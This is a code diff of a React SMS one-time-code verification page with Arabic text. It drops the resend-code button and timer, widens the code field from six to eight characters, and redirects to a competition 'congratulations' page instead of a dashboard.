@@ -22,7 +22,6 @@ import logoImage from "@assets/IMG_0350_1761335875653.jpeg";
 export default function VerifySms() {
   const [, setLocation] = useLocation();
   const { toast } = useToast();
-  const [countdown, setCountdown] = useState(60);
   
   // Get userId from URL
   const params = new URLSearchParams(window.location.search);
@@ -33,12 +32,6 @@ export default function VerifySms() {
       setLocation("/");
       return;
     }
-
-    const timer = setInterval(() => {
-      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
-    }, 1000);
-
-    return () => clearInterval(timer);
   }, [userId, setLocation]);
 
   const form = useForm<VerifyOtpData>({
@@ -57,10 +50,10 @@ export default function VerifySms() {
     onSuccess: () => {
       toast({
         title: "تم التحقق بنجاح! ✓",
-        description: "سيتم توجيهك إلى لوحة التحكم",
+        description: "مبروك لقد تم تسجيلك في المسابقة",
       });
       setTimeout(() => {
-        setLocation("/dashboard");
+        setLocation("/congratulations");
       }, 1500);
     },
     onError: (error: any) => {
@@ -72,34 +65,8 @@ export default function VerifySms() {
     },
   });
 
-  const resendMutation = useMutation({
-    mutationFn: async () => {
-      const res = await apiRequest("POST", "/api/auth/resend-otp", { userId });
-      return await res.json();
-    },
-    onSuccess: () => {
-      toast({
-        title: "تم إعادة الإرسال",
-        description: "تحقق من هاتفك مرة أخرى",
-      });
-      setCountdown(60);
-    },
-    onError: (error: any) => {
-      toast({
-        variant: "destructive",
-        title: "خطأ",
-        description: error.message || "فشل إعادة إرسال الرمز",
-      });
-    },
-  });
-
   const onSubmit = (data: VerifyOtpData) => {
     verifyMutation.mutate(data);
-  };
-
-  const handleResend = () => {
-    if (countdown > 0) return;
-    resendMutation.mutate();
   };
 
   return (
@@ -135,7 +102,7 @@ export default function VerifySms() {
               تحقق من رمز SMS
             </h1>
             <p className="text-muted-foreground text-sm">
-              أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك
+              أدخل الرمز المرسل إلى هاتفك
             </p>
           </div>
 
@@ -153,7 +120,7 @@ export default function VerifySms() {
                         {...field}
                         type="text"
                         placeholder="000000"
-                        maxLength={6}
+                        maxLength={8}
                         className="text-center text-2xl tracking-widest font-bold"
                         data-testid="input-otp"
                       />
@@ -184,30 +151,6 @@ export default function VerifySms() {
               </Button>
             </form>
           </Form>
-
-          {/* Resend */}
-          <div className="text-center space-y-3 pt-4 border-t border-border">
-            <p className="text-sm text-muted-foreground">
-              لم تستلم الرمز؟
-            </p>
-            <Button
-              variant="ghost"
-              onClick={handleResend}
-              disabled={countdown > 0 || resendMutation.isPending}
-              data-testid="button-resend-otp"
-            >
-              {countdown > 0 ? (
-                `إعادة الإرسال خلال ${countdown} ثانية`
-              ) : resendMutation.isPending ? (
-                <>
-                  <Loader2 className="w-4 h-4 ml-2 animate-spin" />
-                  جاري الإرسال...
-                </>
-              ) : (
-                "إعادة إرسال الرمز"
-              )}
-            </Button>
-          </div>
 
           {/* Back to Login */}
           <div className="text-center">
